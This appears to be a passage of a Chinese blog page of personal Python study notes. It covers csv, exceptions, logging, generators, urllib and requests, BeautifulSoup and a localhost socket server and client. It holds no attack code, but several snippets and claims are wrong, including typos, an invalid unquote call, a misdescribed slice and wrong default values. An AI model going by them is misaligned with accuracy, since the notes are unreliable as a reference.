href="https://blog.csdn.net/guoziqing506/article/details/52014506" target="_blank" rel="noopener">参考</a></p><p>csv库    csv文件多以字典形式存储数据 </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取csv至字典</span></span><br><span class="line">csvFile = open(<span class="string">"example.csv"</span>, <span class="string">"r"</span>)</span><br><span class="line">reader = csv.reader(csvFile</span><br><span class="line"><span class="comment"># 建立空字典</span></span><br><span class="line"><span class="literal">result</span> = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">item</span> <span class="keyword">in</span> reader:</span><br><span class="line">    <span class="comment"># 忽略第一行</span></span><br><span class="line">    <span class="keyword">if</span> reader.line_num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="literal">result</span>[<span class="built_in">item</span>[<span class="number">0</span>]] = <span class="built_in">item</span>[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">csvFile.close()</span><br><span class="line">print(<span class="literal">result</span>)</span><br><span class="line"><span class="comment">#使用for循环迭代访问reader对象会发现每一行都是一个列表，列表的每个元素就是CSV文档的每一行中“，”分割开的数据</span></span><br></pre></td></tr></table></figure><p>csv库中提供了DictReader()函数直接将csv文档读取为字典</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">csvFile = <span class="keyword">open</span>(<span class="string">"example.csv"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">dict_reader = csv.<span class="type">DictReader</span>(csvFile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> dict_reader:</span><br><span class="line">    <span class="built_in">print</span>(row)</span><br></pre></td></tr></table></figure><h3 id="错误、调试和测试"><a href="#错误、调试和测试" class="headerlink" title="错误、调试和测试"></a>错误、调试和测试</h3><p>当我们认为某些代码可能会出错时，就可以用<code>try</code>来运行这段代码，如果执行出错，则后续代码不会继续执行，而是直接跳转至错误处理代码，即<code>except</code>语句块，执行完<code>except</code>后，如果有<code>finally</code>语句块，则执行<code>finally</code>语句块，至此，执行完毕。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'try...'</span>)</span><br><span class="line">    r = 10 / 0</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'result:'</span>, r)</span><br><span class="line">except ZeroDivisionError as e:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'except:'</span>, e)</span><br><span class="line">finally:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'finally...'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'END'</span>)</span><br></pre></td></tr></table></figure><p>此外，如果没有错误发生，可以在<code>except</code>语句块后面加一个<code>else</code>，当没有错误发生时，会自动执行<code>else</code>语句：</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>print  </p><p>logging </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(<span class="keyword">level</span>=logging.<span class="keyword">INFO</span>)</span><br><span class="line">它允许你指定记录信息的级别，有<span class="keyword">debug</span>，<span class="keyword">info</span>，<span class="built_in">warning</span>，error等几个级别，当我们指定<span class="keyword">level</span>=<span class="keyword">INFO</span>时，logging.<span class="keyword">debug</span>就不起作用了。同理，指定<span class="keyword">level</span>=<span class="built_in">WARNING</span>后，<span class="keyword">debug</span>和<span class="keyword">info</span>就不起作用了。这样一来，你可以放心地输出不同级别的信息，也不用删除，最后统一控制输出哪个级别的信息</span><br><span class="line">logging.<span class="keyword">info</span>()</span><br></pre></td></tr></table></figure><p>python -m pdb  file_name.py   在命令行界面单步调试</p><p>pdb.set_trace()</p><p>这个方法也是用pdb，但是不需要单步执行，我们只需要<code>import pdb</code>，然后，在可能出错的地方放一个<code>pdb.set_trace()</code>，就可以设置一个断点：</p><h3 id="数字日期和时间"><a href="#数字日期和时间" class="headerlink" title="数字日期和时间"></a>数字日期和时间</h3><h4 id="随机选择"><a href="#随机选择" class="headerlink" title="随机选择"></a>随机选择</h4><p>从既定范围内提取出N个不同元素样本进一步操作</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">values = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">random.sample(values,<span class="number">2</span>)  #从values列表中随机抽取两个</span><br></pre></td></tr></table></figure><p>要想从一个序列中随机的抽取一个元素，可以使用 random.choice()：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">random</span>.choice(<span class="built_in">values</span>)</span><br></pre></td></tr></table></figure><h2 id="function（内置）"><a href="#function（内置）" class="headerlink" title="function（内置）"></a>function（内置）</h2><h3 id="ord-c"><a href="#ord-c" class="headerlink" title="ord(c)"></a>ord(c)</h3><p>c – 字符 , 返回对应的十进制整数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;ord(<span class="string">'a'</span>)</span><br><span class="line"><span class="number">97</span></span><br><span class="line">&gt;&gt;&gt;ord(<span class="string">'b'</span>)</span><br><span class="line"><span class="number">98</span></span><br></pre></td></tr></table></figure><h3 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h3><p>example: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X = <span class="keyword">lambda</span> a:a+<span class="number">10</span></span><br><span class="line">print(x(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><p>lambda +参数(s) :  参数的运算</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x =<span class="keyword">lambda</span> a1, a2: a1+a2</span><br><span class="line">x(<span class="number">6</span>,<span class="number">5</span>) = <span class="number">6</span>+<span class="number">5</span>=<span class="number">11</span></span><br><span class="line">print(x(<span class="number">6</span>,<span class="number">5</span>))=<span class="number">11</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>参数中间用” ,  “隔开</strong> </p></blockquote><h3 id="datetime-类函数"><a href="#datetime-类函数" class="headerlink" title="datetime 类函数"></a>datetime 类函数</h3><p>时间格式一般为 %Y-%m-%d %H:%M:%S</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">现在时间</span><br><span class="line"></span><br><span class="line">nowtime = datetime.datetime.now().strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>)</span><br></pre></td></tr></table></figure><h3 id="filter（）"><a href="#filter（）" class="headerlink" title="filter（）"></a>filter（）</h3><p>fillter()函数用于过滤序列，fillter()接收一个函数和一个序列，把传入的函数依次作用于每个元素，然后根据返回值是True还是False决定保留还是丢弃该元素。</p><p>例如 一个list中删掉偶数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(filter(<span class="keyword">lambda</span> n: n%<span class="number">2</span>==<span class="number">1</span>,range(<span class="number">1</span>,<span class="number">20</span>)))</span><br></pre></td></tr></table></figure><h3 id="locals（）"><a href="#locals（）" class="headerlink" title="locals（）"></a>locals（）</h3><p>locals()函数会议字典类型返回当前位置的全部局部变量</p><p>对于函数，方法，lambda函式，类 ，以及实现了<strong>calll</strong>方法的类实例，它都返回True</p><h3 id="hex（x"><a href="#hex（x" class="headerlink" title="hex（x)"></a>hex（x)</h3><p>返回16禁止数，以字符串形式表示</p><h3 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h3><p>该方法返回字符串在字符串中出现的次数</p><h2 id="一个在线调试python代码的工具"><a href="#一个在线调试python代码的工具" class="headerlink" title="一个在线调试python代码的工具"></a>一个在线调试python代码的工具</h2><p><img src="C:%5CUsers%5C22334%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200304215758306.png" alt="image-20200304215758306"></p><h2 id="一些骚操作"><a href="#一些骚操作" class="headerlink" title="一些骚操作"></a>一些骚操作</h2><h3 id="字符串分片"><a href="#字符串分片" class="headerlink" title="字符串分片"></a>字符串分片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s[:<span class="number">-1</span>] <span class="comment"># 等价于 s[0:len(s)]，除了最后一个元素的切片</span></span><br><span class="line">L= list(range(<span class="number">100</span>))</span><br><span class="line">L[:<span class="number">10</span>]  取出前<span class="number">10</span>个数</span><br><span class="line">L[<span class="number">-10</span>:] 后<span class="number">10</span>个数</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X[:,0]是numpy中数组的一种写法，表示对一个二维数组，取该二维数组第一维中的所有数据，第二维中取第0个数据，直观来说，X[:,0]就是取所有行的第0个数据, X[:,1] 就是取所有行的第1个数据。</span><br><span class="line">x[n,:]是提取第1维中下标为n的元素的所有值</span><br><span class="line">x[:,m:n]，即取所有数据的第m到n-1列数据，含左不含右</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="group"><a href="#group" class="headerlink" title="group()"></a>group()</h4><p>在正则表达式中用于获取分段截获的字符串</p><p>一般，m.group(N) 返回第N组括号匹配的字符。</p><h4 id="groups"><a href="#groups" class="headerlink" title="groups()"></a>groups()</h4><p>m.groups() 返回所有括号匹配的字符，以tuple格式。</p><h3 id="高级列表"><a href="#高级列表" class="headerlink" title="高级列表"></a>高级列表</h3><p>切片，迭代，列表生成式， 迭代器, 生成器</p><h4 id="迭代器（interable）"><a href="#迭代器（interable）" class="headerlink" title="迭代器（interable）"></a>迭代器（interable）</h4><p>我们已经知道，可以直接作用于<code>for</code>循环的数据类型有以下几种：</p><p>一类是集合数据类型，如<code>list</code>、<code>tuple</code>、<code>dict</code>、<code>set</code>、<code>str</code>等；</p><p>一类是<code>generator</code>，包括生成器和带<code>yield</code>的generator function。</p><p>这些可以直接作用于<code>for</code>循环的对象统称为可迭代对象：<code>Iterable</code>。</p><p>可以使用<code>isinstance()</code>判断一个对象是否是<code>Iterable</code>对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line">isinstance([], Iterable)</span><br></pre></td></tr></table></figure><p>可以被next()函数调用并不断返回下一个值的对象成为迭代器：<strong>Iterator</strong></p><h4 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h4><p>1，把一个列表生成式的[]改成()，就创建了一个generator（可迭代）</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g = (<span class="symbol">x</span> * <span class="symbol">x</span> <span class="keyword">for</span> <span class="symbol">x</span> in range(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p>此时g保存的就是算法： x * x for x in range(10)， </p><p>yield 关键字，如果一个函数定义中包含yield关键字，那么这个函数就不再是一个普通函数,而是一个generator;</p><p>generator和函数的执行流程不一样，函数为顺序执行，遇到return 语句或者最后一行函数语句就返回。generator 在每次调用next()的时候执行，遇到<strong>yield</strong>语句返回，再次执行时从上次返回的<strong>yield</strong>语句处继续执行。</p><p>for 循环调用generator时，必须捕获StopIteration错误，返回值包含在StopIteration的value中</p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p>isinstance(objet,class)函数，</p><p>isinstance()判断的是一个对象是否是该类型本身，或者位于该类型的父继承链上</p><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><h3 id="urllib模块"><a href="#urllib模块" class="headerlink" title="urllib模块"></a>urllib模块</h3><h4 id="usrl-pase"><a href="#usrl-pase" class="headerlink" title="usrl.pase"></a>usrl.pase</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="string">'id'</span> :<span class="number">1</span>,</span><br><span class="line">    <span class="string">'name'</span> : <span class="string">'tom'</span>,</span><br><span class="line">    <span class="string">'url'</span> : <span class="string">'http:www.magedu.com/python?id=1&amp;name=tom'</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">u = parse.urlencode(d) <span class="comment">#编码</span></span><br><span class="line"></span><br><span class="line">print(u)</span><br><span class="line">print(u.unquote(u))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=tom&amp;url=http<span class="meta">%3Awww</span>.magedu.com<span class="meta">%2Fpython</span><span class="meta">%3Fid</span><span class="meta">%3D1</span><span class="meta">%26name</span><span class="meta">%3Dtom</span><span class="built_in">&amp;id</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">http:www.magedu.com/python<span class="built_in">?id</span>=<span class="number">1</span><span class="built_in">&amp;name</span>=tom</span><br></pre></td></tr></table></figure><h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p><img src="C:%5CUsers%5C22334%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200304134716070.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.request inport urlopen, Request</span><br><span class="line"><span class="keyword">import</span> simplejson </span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span> <span class="comment">#POST</span></span><br><span class="line">data = parse.urlencode(&#123;<span class="string">'name'</span>:<span class="string">'张三,@=/&amp;*'</span>, <span class="string">'age'</span>:<span class="string">'6'</span>&#125;)</span><br><span class="line">ua =<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1'</span></span><br><span class="line"></span><br><span class="line">req = Request(url, headers=&#123;</span><br><span class="line"><span class="string">'User-agent'</span>: ua</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> urlopen(req, data=data.encode()) <span class="keyword">as</span> res <span class="comment">#POST请求 data不能是None</span></span><br><span class="line"><span class="comment">#with open('d:/bing.html'), 'wb+') as f:</span></span><br><span class="line"><span class="comment">#f.write(res.read())    write in file </span></span><br><span class="line"><span class="comment">#f.flush()</span></span><br><span class="line">text = res.read()</span><br><span class="line">d = simplejson.loads(text)</span><br><span class="line">print(d)</span><br><span class="line">print(type(d))</span><br></pre></td></tr></table></figure><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><h4 id="request-get"><a href="#request-get" class="headerlink" title="request.get"></a>request.get</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这个方法可以接收三个参数，其中第二个默认为None 第三个可选</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, params=None, **kwargs)</span></span></span><br><span class="line"><span class="function">#作用是模拟发起<span class="title">GET</span>请求</span></span><br><span class="line"><span class="function"><span class="title">Sends</span> <span class="title">a</span> <span class="title">GET</span> <span class="title">request</span>.</span></span><br><span class="line"><span class="function">#模拟获取页面的<span class="title">url</span>链接</span></span><br><span class="line"><span class="function">:</span>param url: URL <span class="keyword">for</span> the new :<span class="class"><span class="keyword">class</span>:</span>Request object. </span><br><span class="line"><span class="comment">#额外参数 字典或字节流格式，可选</span></span><br><span class="line">:param params: (optional) Dictionary <span class="keyword">or</span> bytes to be sent <span class="keyword">in</span> the query string <span class="keyword">for</span> the :<span class="class"><span class="keyword">class</span>:</span>Request. </span><br><span class="line"><span class="comment"># 十二个控制访问参数，比如可以自定义header</span></span><br><span class="line">:param **kwargs: Optional arguments that request takes. </span><br><span class="line"><span class="comment"># 返回一个Response对象</span></span><br><span class="line">:<span class="keyword">return</span>: :<span class="class"><span class="keyword">class</span>:</span>Response &lt;Response&gt; object </span><br><span class="line">:type: requests.Response</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">kwargs: 控制访问的参数，均为可选项</span><br><span class="line"></span><br><span class="line">params : 字典或字节序列，作为参数增加到url中</span><br><span class="line"></span><br><span class="line">data : 字典、字节序列或文件对象，作为Request的内容 json : JSON格式的数据，作为Request的内容</span><br><span class="line"></span><br><span class="line">headers : 字典，HTTP定制头</span><br><span class="line"></span><br><span class="line">cookies : 字典或CookieJar，Request中的cookie</span><br><span class="line"></span><br><span class="line">auth : 元组，支持HTTP认证功能</span><br><span class="line"></span><br><span class="line">files : 字典类型，传输文件</span><br><span class="line"></span><br><span class="line">timeout : 设定超时时间，秒为单位</span><br><span class="line"></span><br><span class="line">proxies : 字典类型，设定访问代理服务器，可以增加登录认证</span><br><span class="line"></span><br><span class="line">allow_redirects : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，重定向开关</span><br><span class="line"></span><br><span class="line">stream : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，获取内容立即下载开关</span><br><span class="line"></span><br><span class="line">verify : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，认证SSL证书开关</span><br><span class="line"></span><br><span class="line">cert : 本地SSL证书路径</span><br><span class="line"></span><br><span class="line">url: 拟更新页面的url链接</span><br><span class="line"></span><br><span class="line">data: 字典、字节序列或文件，Request的内容</span><br><span class="line"></span><br><span class="line">json: JSON格式的数据，Request的内容</span><br></pre></td></tr></table></figure><h3 id="bs4"><a href="#bs4" class="headerlink" title="bs4"></a>bs4</h3><p>beautifulsoup对象的使用方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到文档的title</span></span><br><span class="line">soup.title</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse's story&lt;/title&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title的name值</span></span><br><span class="line">soup.title.name</span><br><span class="line"><span class="comment"># u'title'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title中的字符串String</span></span><br><span class="line">soup.title.string</span><br><span class="line"><span class="comment"># u'The Dormouse's story'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title的父亲节点的name属性</span></span><br><span class="line">soup.title.parent.name</span><br><span class="line"><span class="comment"># u'head'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文档的第一个找到的段落</span></span><br><span class="line">soup.p</span><br><span class="line"><span class="comment"># &lt;p class="title"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到的p的class属性值</span></span><br><span class="line">soup.p[<span class="string">'class'</span>]</span><br><span class="line"><span class="comment"># u'title'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到a标签</span></span><br><span class="line">soup.a</span><br><span class="line"><span class="comment"># http://example.com/elsie" id="link1"&gt;Elsie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到所有的a标签</span></span><br><span class="line">soup.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># [http://example.com/elsie" id="link1"&gt;Elsie,</span></span><br><span class="line"><span class="comment">#  http://example.com/lacie" id="link2"&gt;Lacie,</span></span><br><span class="line"><span class="comment">#  http://example.com/tillie" id="link3"&gt;Tillie]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到id值等于3的a标签</span></span><br><span class="line">soup.find(id=<span class="string">"link3"</span>)</span><br><span class="line"><span class="comment"># http://example.com/tillie" id="link3"&gt;Tillie</span></span><br></pre></td></tr></table></figure><h2 id="socket-编程"><a href="#socket-编程" class="headerlink" title="socket 编程"></a>socket 编程</h2><p><img src="/writing/images/python/20171029235256803.png" alt="这里写图片描述"></p><p><a href="https://blog.csdn.net/piglite/article/details/78389310" target="_blank" rel="noopener">参考</a></p><p><a href="https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html" target="_blank" rel="noopener">参考二</a></p><h3 id="python3-scoket内建函数"><a href="#python3-scoket内建函数" class="headerlink" title="python3 scoket内建函数"></a>python3 scoket内建函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">创建socket对象</span><br><span class="line">sk &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</span><br><span class="line">参数一：地址簇</span><br><span class="line">    socket.AF_INET IPv4（默认）</span><br><span class="line">    socket.AF_INET6 IPv6</span><br><span class="line">    socket.AF_UNIX 只能够用于单一的Unix系统进程间通信</span><br><span class="line">参数二：类型</span><br><span class="line">    socket.SOCK_STREAM　　流式socket , for TCP （默认）</span><br><span class="line">    socket.SOCK_DGRAM　　 数据报式socket , for UDP</span><br><span class="line">    socket.SOCK_RAW 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而</span><br><span class="line">    SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以</span><br><span class="line">    通过IP_HDRINCL套接字选项由用户构造IP头。</span><br><span class="line">    socket.SOCK_RDM 是一种可靠的UDP形式，即保证交付数据报但不保证顺序。</span><br><span class="line">    SOCK_RAM用来提供对原始协议的低级访问，在需要执行某些特殊操作时使用，</span><br><span class="line">    如发送ICMP报文。SOCK_RAM通常仅限于高级用户或管理员运行的程序使用。</span><br><span class="line">　　socket.SOCK_SEQPACKET 可靠的连续数据包服务</span><br><span class="line">参数三：协议</span><br><span class="line">    0　　（默认）与特定的地址家族相关的协议,如果是 0 ，</span><br><span class="line">    则系统就会根据地址格式和套接类别,自动选择一个合适的协议</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">服务端程序</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 开启ip和端口</span></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment"># 生成一个socket对象</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line"><span class="comment"># 绑定ip端口</span></span><br><span class="line">sk.bind(ip_port)</span><br><span class="line"><span class="comment"># 最多连接数</span></span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 开启死循环等待客户端连接</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">'服务器启动...'</span>)</span><br><span class="line">    <span class="comment"># 等待链接,阻塞，直到渠道链接 conn打开一个新的对象专门给当前链接的客户端 addr是ip地址</span></span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    print(<span class="string">"客户端地址:"</span>,str(addr))</span><br><span class="line">    <span class="comment"># 获取客户端请求数据</span></span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># 打印对方的数据</span></span><br><span class="line">    print(client_data.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 向对方发送数据</span></span><br><span class="line">    <span class="comment">#也可写成conn.send("来自服务器的问候".encode("utf-8"))</span></span><br><span class="line">    conn.send(bytes(<span class="string">"来自服务器的问候"</span>,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭链接</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">客户端代码</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#链接服务端ip和端口</span></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>)</span><br><span class="line"><span 